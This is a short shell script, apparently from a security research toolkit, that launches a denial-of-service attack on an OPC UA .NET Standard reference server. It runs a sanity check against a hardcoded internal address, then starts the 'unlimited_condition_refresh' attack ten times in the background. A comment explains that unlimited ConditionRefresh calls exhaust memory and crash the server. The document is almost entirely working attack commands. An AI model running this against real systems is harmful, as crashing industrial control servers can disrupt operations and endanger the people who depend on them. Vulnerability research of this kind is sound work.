#!/bin/sh
# Uncontrolled ConditionRefresh Attack
#   Triggering MonitoredNodes.cs!ConditionRefresh many times -
#       ConditionRefresh is started in a background thread, the issue is that remote attacker can call ConditionRefresh
#       unlimited number of times which leads to uncontrolled memory consumption and eventually to a crash
# https://reference.opcfoundation.org/v104/Core/docs/Part9/5.5.7/
#

cd ../
source ./venv/bin/activate

IP_ADDR=10.10.6.65

python3 main.py dotnetstd $IP_ADDR 62541 "/Quickstarts/ReferenceServer" sanity

for i in `seq 10`
do
  echo -----$i------
  python3 main.py dotnetstd $IP_ADDR 62541 "/Quickstarts/ReferenceServer" unlimited_condition_refresh &
  sleep 70
done
